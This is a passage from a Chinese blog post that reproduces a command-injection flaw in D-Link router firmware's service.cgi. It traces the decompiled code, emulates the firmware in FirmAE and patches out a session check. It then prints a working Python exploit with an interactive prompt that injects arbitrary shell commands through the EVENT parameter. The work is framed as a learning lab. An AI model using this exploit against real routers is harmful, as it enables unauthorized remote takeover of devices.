<p>在往下看，这里有一个 <code>cgibin_parse_request(sub_40A63C, 0, v2) &gt;= 0</code> 的判断<br>也就是说 <code>cgibin_parse_request(sub_40A63C, 0, v2)</code> 的返回值不能为负数，否则也会执行 <code>goto</code> 导致无法运行到 <code>system</code><br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/28.png"></p>
<p>我们进入 <code>cgibin_parse_request</code> 这个函数中<br>可以看到函数开头使用 <code>getenv</code> 函数获取了几个环境变量，这里我们就可以判断出，如果我们想要利用漏洞就一定需要使用POST传参方式，原因如下</p>
<ul>
<li><code>CONTENT_LENGTH</code> 表示请求体长度</li>
<li>GET 请求的请求体长度为 ​<strong>​0​</strong>​，因此 <code>getenv(&quot;CONTENT_LENGTH&quot;)</code> 返回 <code>NULL</code></li>
<li>只有 POST 请求才有非零的 <code>CONTENT_LENGTH</code></li>
</ul>
<p>然后下面的 <code>v12</code> 是获取到环境变量中的 <code>?</code> 后面的内容，并且后续将作为参数传入到函数<code>sub_402B40</code>中</p>
<p><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/29.png"></p>
<p>下面我们进入 <code>sub_402B40(&amp;v20, v12, v13);函数</code> 中查看</p>
<p><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/30.png"></p>
<p>我们可以看到传入的 <code>v12</code> 是 其中的 <code>a2</code> 并且其中还有一个 <code>v12</code> 而这个 <code>v12 = *(a2+v6)</code> 并且这个 <code>v6从0</code> 开始计算，也就相当于将 <code>a2</code> 一个个取出并且用于判断，通过判断 <code>&amp;</code> 和 <code>=</code> 来对 <code>v12</code> 进行拆分</p>
<p><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/31.png"></p>
<p>所以根据分析 我们可以知道 <code>sub_402B40函数</code> 是一个 ​<code>HTTP查询字符串解析器</code>​​，专门用于 <code>解析URL中的查询参数</code>（如 <code>?key1=value1&amp;key2=value2</code>）</p>
<p>下面我们回到 <code>cgibin_parse_request</code> 继续往下看<br>我们必须进入这个<code>if分支</code>，并且执行这个 <code>return ((&amp;off_42C014)[3 * v16 - 1])(a1, a2, v7, &amp;v14[v17]);</code><br>因为下面全都是 <code>return 负数</code> 这会导致我们返回到 <code>servicecgi_main</code> 中的时候会进入上述我们提到的 <code>if分支</code> 然后就会执行 <code>goto</code> 导致无法执行 <code>system函数</code><br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/32.png"></p>
<p>而这里的return逻辑 <code>if ( !strncasecmp(v14, v18, v17) )</code> 就是我们的 <code>v14</code> 的 <code>前v17个字节</code> 需要和 <code>v18相同</code><br>而这里的 <code>v18 = *v15 = off_42C014</code><br>所以需要看这个 <code>全局变量off_42C014</code><br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/33.png"><br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/34.png"></p>
<p>而 <code>off_42C014</code> 开头的字符串为 <code>application/</code> (其实这里固定套路了，大多数时候都是 <code>application/x-www-form-urlencoded</code>)</p>
<p>我们继续往下分析我们可以知道他最终是会调用 <code>sub_403B10</code> 这个函数<br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/35.png"><br>这个函数的开头同样也是一个判断，继续进行比较后续的字符串是否为 <code>x-www-form-urlencoded</code> 所以其实我们最终需要传入的那个环境变量<code>Content-Type</code>为 <code>application/x-www-form-urlencoded</code> 才符合条件</p>
<p>而这个 <code>application/x-www-form-urlencoded</code> 是一种 ​<strong>​HTTP 请求内容编码格式​</strong>​，主要用于 HTML 表单（<code>&lt;form&gt;</code>）提交数据时的默认编码方式，它是 Web 开发中最基础的数据传输格式之一，用于 <code>POST</code> </p>
<p>所以接着我们会进入 <code>sub_402FFC</code><br>在 <code>sub_402FFC</code> 中同样有 <code>sub_402B40</code> 用于切割字符串，这里不再详细分析<br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/36.png"></p>
<p>下面回到 <code>servicecgi_main</code> 继续往下看有一个 <code>sess_ispoweruser</code><br>这个函数里面有很多子函数，里面的子函数会打开很多文件，如果我们直接使用qemu之类去模拟仿真的时候会因为缺少这些文件而导致复现失败，所以这里复现的时候我们一般就直接将它nop掉就行了</p>
<p>然后终于就是到了我们的漏洞部分<br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/37.png"></p>
<p>这里可以看到 <code>v5</code> 的内容会被拼接到system的指令中去，而 <code>v5</code> 是我们用户可控的部分，这也是漏洞产生的原因</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a><strong>漏洞复现</strong></h3><p>使用FirmAE进行仿真<br>这里我们先不修改直接使用下载的.bin文件来试一下</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./run.sh -d dlink &lt;DIR815A1_FW103b01.bin的路径&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/38.png"></p>
<p>仿真成功后可以使用浏览器进行访问  <code>192.168.0.1:80</code><br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/39.png"></p>
<p>下面编写exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">target_ip, command</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    利用 D-Link 路由器命令注入漏洞执行任意命令</span></span><br><span class="line"><span class="string">    :param target_ip: 路由器IP地址 (FirmAE仿真地址)</span></span><br><span class="line"><span class="string">    :param command: 要执行的系统命令</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 构造恶意URL（关键注入点）</span></span><br><span class="line">    payload = <span class="string">f&quot;;<span class="subst">&#123;command&#125;</span>;&quot;</span></span><br><span class="line">    encoded_payload = urllib.parse.quote(payload, safe=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    vuln_url = <span class="string">f&quot;http://<span class="subst">&#123;target_ip&#125;</span>/service.cgi?EVENT=<span class="subst">&#123;encoded_payload&#125;</span>&amp;abc&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 设置恶意请求头</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Content-Length&quot;</span>: <span class="string">&quot;14&quot;</span>,  <span class="comment"># 必须与body长度匹配</span></span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>  <span class="comment"># 防止连接复用问题</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 固定请求体（触发漏洞必需）</span></span><br><span class="line">    data = <span class="string">&quot;XiDP=BabyPwner&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 发送恶意请求</span></span><br><span class="line">        response = requests.post(</span><br><span class="line">            vuln_url,</span><br><span class="line">            headers=headers,</span><br><span class="line">            data=data,</span><br><span class="line">            timeout=<span class="number">5</span>,</span><br><span class="line">            verify=<span class="literal">False</span>  <span class="comment"># 忽略SSL证书验证</span></span><br><span class="line">        )</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 检查响应状态</span></span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] 命令注入成功！状态码: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] 响应内容:\n<span class="subst">&#123;response.text[:<span class="number">500</span>]&#125;</span>...&quot;</span>)  <span class="comment"># 显示部分响应</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[-] 请求失败！状态码: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] 网络错误: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;------- D-Link DIR-823G 命令注入漏洞 (CNVD-2018-01084) -------&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 设置目标IP（FirmAE仿真地址）</span></span><br><span class="line">    target_ip = <span class="string">&quot;192.168.0.1&quot;</span>  <span class="comment"># 修改为实际仿真IP</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 获取用户输入命令</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        cmd = <span class="built_in">input</span>(<span class="string">&quot;command&gt; &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> cmd.lower() <span class="keyword">in</span> [<span class="string">&quot;exit&quot;</span>, <span class="string">&quot;quit&quot;</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">        <span class="comment"># 执行漏洞利用</span></span><br><span class="line">        exploit(target_ip, cmd)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 验证命令执行（可选）</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;&gt;&quot;</span> <span class="keyword">in</span> cmd:  <span class="comment"># 如果命令有输出文件</span></span><br><span class="line">            output_file = cmd.split(<span class="string">&quot;&gt;&quot;</span>)[-<span class="number">1</span>].strip()</span><br><span class="line">            check_url = <span class="string">f&quot;http://<span class="subst">&#123;target_ip&#125;</span>/<span class="subst">&#123;output_file&#125;</span>&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                check_res = requests.get(check_url, timeout=<span class="number">3</span>)</span><br><span class="line">                <span class="keyword">if</span> check_res.status_code == <span class="number">200</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[+] 命令输出已保存到: <span class="subst">&#123;output_file&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[*] 内容预览:\n<span class="subst">&#123;check_res.text[:<span class="number">200</span>]&#125;</span>...&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[-] 无法验证输出文件: <span class="subst">&#123;output_file&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>这里如果我们直接运行脚本然后输入指令最后显示的结果是FAILED也就是失败了，这是因为我们还没有去掉上面我们提到的 <code>sess_ispoweruser</code><br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/40.png"></p>
<p>下面我们将<code>.bin</code>文件使用<code>binwalk</code>进行分解，然后使用IDA将<code>cgibin</code>中<code>sess_ispoweruser</code>函数去掉<br>下面是程序nop修改之后的样子 下面的 <code>v4</code> 就是我们上面提到的 <code>v5</code><br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/41.png"><br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/42.png"></p>
<p>去掉之后我们通过IDA将修改后的部分保存，然后替换掉原本的 <code>cgibin</code> 文件<br>然后我们回到 <code>squashfs-root</code> 文件夹执行下面指令</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mksquashfs ./squashfs-root/ ./rootfs.squashfs -comp gzip</span><br></pre></td></tr></table></figure>

<p>然后我们就可以得到 <code>rootfs.squashfs</code> 这个文件<br>我们再次使用FirmAE进行仿真<br>使用下面指令</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./run.sh -d dlink &lt;rootfs.squashfs的路径&gt;</span><br></pre></td></tr></table></figure>

<p>仿真成功后再次使用我们的exp，发现现在是显示 <code>OK</code> 了，创建文件也可以成功了 (但是我试了一下，ls依旧是没有回显的)<br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/43.png"><br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/44.png"></p>
<p>这里虽然我们直接使用ls没有回显，但是我们可以创建文件来读取，如下<br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/45.png"></p>
<p>想要读取完整内容，我们可以直接通过浏览器网址访问对应文件<br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/46.png"></p>
<p>浏览器可以直接下载我们使用命令创建的文件<br>那么这个漏洞就复现到这里</p>
<p>参考:<br><a target="_blank" rel="noopener" href="https://www.iotsec-zone.com/article/456#di-8100">D-Link DI-8100命令执行漏洞复现 - IOTsec-Zone</a><br><a target="_blank" rel="noopener" href="https://www.iotsec-zone.com/article/454#%E6%BC%8F%E6%B4%9E%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90">D-Link DI-8100命令注入 &amp;&amp; 调试分析 - IOTsec-Zone</a><br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/8FwdueaInaIvFVMLMY678Q">D-Link DIR 615&#x2F;645&#x2F;815 service.cgi远程命令执行漏洞</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">XiDP</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/07/13/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">http://example.com/2025/07/13/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">XiDP</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/IOT/">IOT</a><a class="post-meta__tags" href="/tags/CVE/">CVE</a><a class="post-meta__tags" href="/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/">路由器</a><a class="post-meta__tags" href="/tags/%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">远程命令执行</a></div><div class="post-share"><div class="social-share" data-image="/img/Qhead.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/07/12/CVE-2017-17215%20%E5%8D%8E%E4%B8%BAHG532%E8%B7%AF%E7%94%B1%E5%99%A8RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="CVE-2017-17215 华为HG532路由器RCE漏洞复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">CVE-2017-17215 华为HG532路由器RCE漏洞复现</div></div><div class="info-2"><div class="info-item-1">漏洞描述CVE-2017-17215是CheckPoint团队披露的远程命令执行（RCE）漏洞，存在于华为HG532路由器中。该设备支持名为DeviceUpgrade的一种服务类型，可通过向/ctrlt/DeviceUpgrade_1的地址提交请求，来执行固件的升级操作。可通过向37215端口发送数据包，启用UPnP协议服务，并利用该漏洞，在NewStatusURL或NewDownloadURL标签中注入任意命令以执行。 漏洞披露:https://research.checkpoint.com/2017/good-zero-day-skiddie/ 附件下载:通过网盘分享的文件：HG532eV100R001C02B015_upgrade_main.bin链接: https://pan.baidu.com/s/1r9fkxyNBKFhvu0uDRKzElg?pwd=xidp 提取码: xidp 漏洞分析根据官方的漏洞报告，我们知道漏洞存在于/bin/upnp二进制文件按照官方报告中提到的 NewStatusURL 或 NewDownloadURL...</div></div></div></a><a class="pagination-related" href="/2025/07/14/qemu%E6%90%AD%E5%BB%BAARM64%E7%8E%AF%E5%A2%83/" title="qemu搭建ARM64环境"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">qemu搭建ARM64环境</div></div><div class="info-2"><div class="info-item-1">所需前置准备创建磁盘文件并下载内核镜像、内存盘镜像文件 12345678qemu-img create -f qcow2 debian-3607-aarch64.qcow2 32Gwget http://ftp.au.debian.org/debian/dists/bullseye/main/installer-arm64/current/images/netboot/debian-installer/arm64/initrd.gzwget http://ftp.au.debian.org/debian/dists/bullseye/main/installer-arm64/current/images/netboot/debian-installer/arm64/linuxwget http://ftp.au.debian.org/debian/dists/bullseye/main/installer-arm64/current/images/netboot/mini.iso  上述命令执行完毕之后可以得到下面这几个文件 1debian-3607-aarch64.qcow2...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/07/12/CVE-2017-17215%20%E5%8D%8E%E4%B8%BAHG532%E8%B7%AF%E7%94%B1%E5%99%A8RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="CVE-2017-17215 华为HG532路由器RCE漏洞复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-12</div><div class="info-item-2">CVE-2017-17215 华为HG532路由器RCE漏洞复现</div></div><div class="info-2"><div class="info-item-1">漏洞描述CVE-2017-17215是CheckPoint团队披露的远程命令执行（RCE）漏洞，存在于华为HG532路由器中。该设备支持名为DeviceUpgrade的一种服务类型，可通过向/ctrlt/DeviceUpgrade_1的地址提交请求，来执行固件的升级操作。可通过向37215端口发送数据包，启用UPnP协议服务，并利用该漏洞，在NewStatusURL或NewDownloadURL标签中注入任意命令以执行。 漏洞披露:https://research.checkpoint.com/2017/good-zero-day-skiddie/ 附件下载:通过网盘分享的文件：HG532eV100R001C02B015_upgrade_main.bin链接: https://pan.baidu.com/s/1r9fkxyNBKFhvu0uDRKzElg?pwd=xidp 提取码: xidp 漏洞分析根据官方的漏洞报告，我们知道漏洞存在于/bin/upnp二进制文件按照官方报告中提到的 NewStatusURL 或 NewDownloadURL...</div></div></div></a><a class="pagination-related" href="/2025/06/13/D-Link%20%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/" title="D-Link 登录信息泄露（权限绕过）漏洞分析报告（CVE-2018-7034）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-13</div><div class="info-item-2">D-Link 登录信息泄露（权限绕过）漏洞分析报告（CVE-2018-7034）</div></div><div class="info-2"><div class="info-item-1">前言漏洞编号CVE-2018-7034，影响D-Link和TrendNet的一些老设备。 通过网盘分享的文件：TEW751DR_FW103B03.bin链接: https://pan.baidu.com/s/1g37sSUnZQDQjpg_ABuGULg?pwd=xidp 提取码: xidp 这里分析的是TrendNet TEW751的固件，此外D-Link的一些老设备，如DIR645，DIR815等也都受该漏洞影响。 基础工具配置复现环境 Ubuntu 24.04.2 LTS 基础工具配置可以参考这篇文章中的配置: DIR-815 栈溢出漏洞(CNVD-2013-11625)复现-先知社区 漏洞分析存在漏洞的地方为 /squashfs-root/htdocs/web/getcfg.php  这里通过 $AUTHORIZED_GROUP 变量判断用户权限而 $GETCFG_SVC = cut($_POST[&quot;SERVICES&quot;], $SERVICE_INDEX, &quot;,&quot;); 中，$GETCFG_SVC 是通过 POST 传入的...</div></div></div></a><a class="pagination-related" href="/2025/06/14/DIR-815%20%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/" title="DIR-815 栈溢出漏洞(CNVD-2013-11625)复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-14</div><div class="info-item-2">DIR-815 栈溢出漏洞(CNVD-2013-11625)复现</div></div><div class="info-2"><div class="info-item-1">复现环境及所需工具漏洞复现环境Ubuntu 24.04.2 LTS 基础工具配置基础的Pwn环境 + binwalk + sasquatch + qemupwn环境配置推荐YX-hueimie师傅的博客★pwn 24.04环境搭建保姆级教程★_ubuntu24 pwn-CSDN博客★pwn 22.04环境搭建保姆级教程★_pwn环境搭建-CSDN博客 安装binwalk可以直接使用apt安装，也可以下载binwalk的源码来自己编译 1sudo apt install binwalk  sasquatch 是binwalk用于解压非标准SquashFS文件系统的关键依赖(入门不安装这个那么我们之后binwalk分解固件会发现里面 squashfs-root 文件夹是空的)安装方法如下: 123456# 安装依赖库（关键步骤，否则编译会失败） sudo apt-get install build-essential zlib1g-dev liblzma-dev liblzo2-dev # 克隆仓库并编译 git clone...</div></div></div></a><a class="pagination-related" href="/2025/07/14/qemu%E6%90%AD%E5%BB%BAARM64%E7%8E%AF%E5%A2%83/" title="qemu搭建ARM64环境"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-14</div><div class="info-item-2">qemu搭建ARM64环境</div></div><div class="info-2"><div class="info-item-1">所需前置准备创建磁盘文件并下载内核镜像、内存盘镜像文件 12345678qemu-img create -f qcow2 debian-3607-aarch64.qcow2 32Gwget http://ftp.au.debian.org/debian/dists/bullseye/main/installer-arm64/current/images/netboot/debian-installer/arm64/initrd.gzwget http://ftp.au.debian.org/debian/dists/bullseye/main/installer-arm64/current/images/netboot/debian-installer/arm64/linuxwget http://ftp.au.debian.org/debian/dists/bullseye/main/installer-arm64/current/images/netboot/mini.iso  上述命令执行完毕之后可以得到下面这几个文件 1debian-3607-aarch64.qcow2...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/Qhead.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">XiDP</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">21</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/XiDP0"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">So get away</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#D-Link-DI-8100%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">D-Link DI_8100命令执行漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%80%E9%9C%80%E5%B7%A5%E5%85%B7"><span class="toc-number">1.1.</span> <span class="toc-text">所需工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp%E7%BC%96%E5%86%99"><span class="toc-number">1.3.</span> <span class="toc-text">exp编写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E8%B0%83%E8%AF%95"><span 